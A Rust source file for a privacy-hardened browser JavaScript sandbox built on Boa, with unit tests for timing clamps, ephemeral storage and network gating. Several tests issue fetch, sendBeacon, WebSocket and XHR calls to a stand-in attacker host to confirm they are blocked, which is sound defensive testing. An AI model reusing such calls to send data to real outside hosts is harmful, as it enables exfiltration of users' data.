//! CitadelJSEngine — the page's real JavaScript, run in a cage we built.
//!
//! The engine *core* is Boa (pure Rust, no native attack surface). The product is
//! the **binding layer**: a bare Boa [`Context`] exposes no browser, network, DOM,
//! or storage APIs, so the page can only see and do what we deliberately bind.
//! Every binding is privacy-hardened — normalized identity, poisoned fingerprint
//! readbacks, a network exfil gate, isolated storage. Boa runs the site's actual
//! logic correctly; every *observation* it makes is something we authored.
//!
//! JavaScript is OFF by default and runs only as an explicit opt-in
//! (`SecurityContext::allows_scripts`), inside the per-tab ZK boundary.

mod bindings;

pub use bindings::PrivacyProfile;

use crate::error::{ParserError, ParserResult};
use crate::security::SecurityContext;
use boa_engine::{Context, JsValue, Source};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;

/// Convert a Boa `JsValue` to a display string (handles undefined/null).
fn js_value_to_string(value: &JsValue, ctx: &mut Context) -> String {
    if value.is_undefined() {
        return "undefined".to_string();
    }
    if value.is_null() {
        return "null".to_string();
    }
    value
        .to_string(ctx)
        .map(|s| s.to_std_string_escaped())
        .unwrap_or_else(|_| format!("{:?}", value))
}

/// The page's JavaScript engine: Boa core + our privacy binding layer.
pub struct CitadelJSEngine {
    /// Security policy (gates whether scripts run at all).
    security_context: Arc<SecurityContext>,
    /// The privacy identity/seed the bindings present to the page.
    profile: PrivacyProfile,
    /// Whether the engine is running inside ZKVM isolation.
    zkvm_isolated: bool,
    /// Total scripts executed.
    scripts_executed: AtomicU64,
    /// Security/eval errors observed.
    security_violations: AtomicU64,
    /// Sandboxed executions.
    sandboxed_executions: AtomicU64,
}

impl CitadelJSEngine {
    /// Create an engine with the single normalized privacy identity.
    pub fn new(security_context: Arc<SecurityContext>) -> ParserResult<Self> {
        Ok(Self {
            security_context,
            profile: PrivacyProfile::normalized(),
            zkvm_isolated: false,
            scripts_executed: AtomicU64::new(0),
            security_violations: AtomicU64::new(0),
            sandboxed_executions: AtomicU64::new(0),
        })
    }

    /// Create an engine whose fingerprint noise is seeded per first-party origin
    /// (so a site sees a stable identity, but two sites cannot correlate it).
    pub fn for_origin(security_context: Arc<SecurityContext>, origin: &str) -> ParserResult<Self> {
        let mut engine = Self::new(security_context)?;
        engine.profile = PrivacyProfile::for_origin(origin);
        Ok(engine)
    }

    /// Enable ZKVM isolation for this engine.
    pub fn enable_zkvm_isolation(&mut self) -> ParserResult<()> {
        self.zkvm_isolated = true;
        Ok(())
    }

    /// Build a fresh, caged context with the privacy binding layer installed.
    ///
    /// Per-call isolation: every execution gets a new context. The context starts
    /// bare (no browser APIs) and we install only our authored, gated bindings.
    fn caged_context(&self) -> ParserResult<Context> {
        let mut ctx = Context::default();
        bindings::install(&mut ctx, &self.profile).map_err(|e| {
            ParserError::JsError(format!("privacy binding install failed: {e}"))
        })?;
        Ok(ctx)
    }

    /// Run the page's JS in the cage and return its result as a string.
    pub fn execute_simple(&mut self, code: &str) -> ParserResult<String> {
        if !self.security_context.allows_scripts() {
            return Err(ParserError::SecurityViolation(
                "JavaScript is disabled by security policy (explicit opt-in required)".to_string(),
            ));
        }

        let mut ctx = self.caged_context()?;
        match ctx.eval(Source::from_bytes(code)) {
            Ok(value) => {
                self.scripts_executed.fetch_add(1, Ordering::Relaxed);
                Ok(js_value_to_string(&value, &mut ctx))
            }
            Err(e) => {
                self.security_violations.fetch_add(1, Ordering::Relaxed);
                Err(ParserError::JsError(format!("JS execution error: {e}")))
            }
        }
    }

    /// Run JS in the cage and count it as a sandboxed execution.
    pub fn execute_sandboxed(&mut self, code: &str) -> ParserResult<String> {
        let result = self.execute_simple(code)?;
        self.sandboxed_executions.fetch_add(1, Ordering::Relaxed);
        Ok(result)
    }

    /// Run JS with DOM context. DOM bindings are not wired yet (future milestone);
    /// for now this runs the script in the same caged context.
    pub fn execute_browser_script(
        &self,
        code: &str,
        _dom: &crate::dom::Dom,
    ) -> ParserResult<String> {
        if !self.security_context.allows_scripts() {
            return Err(ParserError::SecurityViolation(
                "JavaScript is disabled by security policy (explicit opt-in required)".to_string(),
            ));
        }
        let mut ctx = self.caged_context()?;
        match ctx.eval(Source::from_bytes(code)) {
            Ok(value) => Ok(js_value_to_string(&value, &mut ctx)),
            Err(e) => Err(ParserError::JsError(format!("JS execution error: {e}"))),
        }
    }

    /// Run JS with secure DOM bindings (delegates to `execute_browser_script`).
    pub fn execute_with_secure_dom(
        &mut self,
        dom: &crate::dom::Dom,
        script: &str,
    ) -> Result<String, ParserError> {
        self.execute_browser_script(script, dom)
    }

    /// Whether JS execution is permitted by the security policy.
    pub fn is_js_allowed(&self) -> bool {
        self.security_context.allows_scripts()
    }

    /// Engine statistics.
    pub fn get_stats(&self) -> JSEngineStats {
        JSEngineStats {
            zkvm_isolated: self.zkvm_isolated,
            scripts_executed: self.scripts_executed.load(Ordering::Relaxed),
            security_violations: self.security_violations.load(Ordering::Relaxed),
            sandboxed_executions: self.sandboxed_executions.load(Ordering::Relaxed),
            avg_execution_time: 0.0,
        }
    }

    /// Resource statistics (returns `Some` to signal availability).
    pub fn get_resource_stats(&self) -> Option<JSEngineStats> {
        Some(self.get_stats())
    }
}

/// Statistics for JavaScript engine usage.
#[derive(Debug, Clone, Default)]
pub struct JSEngineStats {
    pub zkvm_isolated: bool,
    pub scripts_executed: u64,
    pub security_violations: u64,
    pub sandboxed_executions: u64,
    pub avg_execution_time: f64,
}

impl JSEngineStats {
    /// Security score based on violations.
    pub fn get_security_score(&self) -> u64 {
        if self.security_violations == 0 {
            100
        } else {
            100u64.saturating_sub((self.security_violations.saturating_mul(10)).min(100))
        }
    }

    /// Whether the engine is operating safely.
    pub fn is_operating_safely(&self) -> bool {
        self.security_violations < 5
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn engine() -> CitadelJSEngine {
        let mut sc = SecurityContext::new(10);
        sc.enable_scripts(); // explicit opt-in
        CitadelJSEngine::new(Arc::new(sc)).expect("engine")
    }

    #[test]
    fn runs_the_pages_real_js() {
        let mut e = engine();
        assert_eq!(e.execute_simple("2 + 2").unwrap(), "4");
        assert_eq!(e.execute_simple("'a' + 'b' + 'c'").unwrap(), "abc");
        assert_eq!(e.execute_simple("[1,2,3].map(x => x*2).join(',')").unwrap(), "2,4,6");
    }

    #[test]
    fn disabled_without_opt_in() {
        let sc = SecurityContext::new(10); // scripts NOT enabled
        let mut e = CitadelJSEngine::new(Arc::new(sc)).unwrap();
        assert!(!e.is_js_allowed());
        assert!(e.execute_simple("2 + 2").is_err());
    }

    #[test]
    fn timing_is_clamped_to_kill_high_res_fingerprints() {
        let mut e = engine();
        // performance.now() exists but is quantized to the coarse resolution, so
        // every reading is a multiple of the quantum (no sub-quantum entropy).
        assert_eq!(e.execute_simple("performance.now() % 100").unwrap(), "0");
        // Two back-to-back reads cannot resolve a sub-quantum interval: the delta
        // is always a multiple of the quantum (microsecond timing is dead).
        assert_eq!(
            e.execute_simple(
                "var a = performance.now(); var b = performance.now(); (b - a) % 100"
            )
            .unwrap(),
            "0"
        );
    }

    #[test]
    fn network_exfil_is_gated() {
        let mut e = engine();
        // Present, so their *absence* isn't itself a fingerprint (they match a
        // mainstream browser's surface)...
        assert_eq!(e.execute_simple("typeof fetch").unwrap(), "function");
        assert_eq!(e.execute_simple("typeof XMLHttpRequest").unwrap(), "function");
        assert_eq!(e.execute_simple("typeof WebSocket").unwrap(), "function");
        assert_eq!(e.execute_simple("typeof RTCPeerConnection").unwrap(), "function");
        assert_eq!(e.execute_simple("typeof navigator.sendBeacon").unwrap(), "function");

        // ...but every exfil path is denied.
        // fetch → a rejected Promise (looks like a blocked/failed request).
        assert_eq!(
            e.execute_simple("Object.prototype.toString.call(fetch('https://evil.example/'))")
                .unwrap(),
            "[object Promise]"
        );
        // sendBeacon → false ("not queued"), no data leaves.
        assert_eq!(
            e.execute_simple("navigator.sendBeacon('https://evil.example/', 'x')")
                .unwrap(),
            "false"
        );
        // WebSocket and WebRTC construction is blocked (no socket, no ICE => no
        // local-IP leak).
        assert!(e.execute_simple("new WebSocket('wss://evil.example/')").is_err());
        assert!(e.execute_simple("new RTCPeerConnection()").is_err());
        // XHR is present but inert: send() issues nothing, status stays 0.
        assert_eq!(
            e.execute_simple(
                "var x = new XMLHttpRequest(); x.open('GET','https://evil.example/'); \
                 x.send(); x.status"
            )
            .unwrap(),
            "0"
        );
    }

    #[test]
    fn storage_is_present_ephemeral_and_supercookie_proof() {
        let mut e = engine();
        assert_eq!(e.execute_simple("typeof localStorage").unwrap(), "object");
        assert_eq!(e.execute_simple("typeof sessionStorage").unwrap(), "object");

        // Faithful Storage API: setItem/getItem round-trips, length, key, remove.
        assert_eq!(
            e.execute_simple("localStorage.setItem('a','1'); localStorage.getItem('a')")
                .unwrap(),
            "1"
        );
        assert_eq!(
            e.execute_simple(
                "localStorage.setItem('a','1'); localStorage.setItem('b','2'); localStorage.length"
            )
            .unwrap(),
            "2"
        );
        // Legacy property-style access works too (Proxy).
        assert_eq!(
            e.execute_simple("localStorage.foo = 'bar'; localStorage.getItem('foo')")
                .unwrap(),
            "bar"
        );
        assert_eq!(
            e.execute_simple(
                "localStorage.setItem('a','1'); localStorage.removeItem('a'); \
                 String(localStorage.getItem('a'))"
            )
            .unwrap(),
            "null"
        );

        // SUPERCOOKIE-PROOF: a value written in one execution does not survive into
        // the next — storage is ephemeral, never persisted to disk.
        e.execute_simple("localStorage.setItem('track','123')").unwrap();
        assert_eq!(
            e.execute_simple("String(localStorage.getItem('track'))").unwrap(),
            "null"
        );
    }

    #[test]
    fn unimplemented_apis_remain_unbound() {
        let mut e = engine();
        // DOM bindings and IndexedDB are not bound yet — undefined (not silently faked).
        assert_eq!(e.execute_simple("typeof document").unwrap(), "undefined");
        assert_eq!(e.execute_simple("typeof indexedDB").unwrap(), "undefined");
    }
}
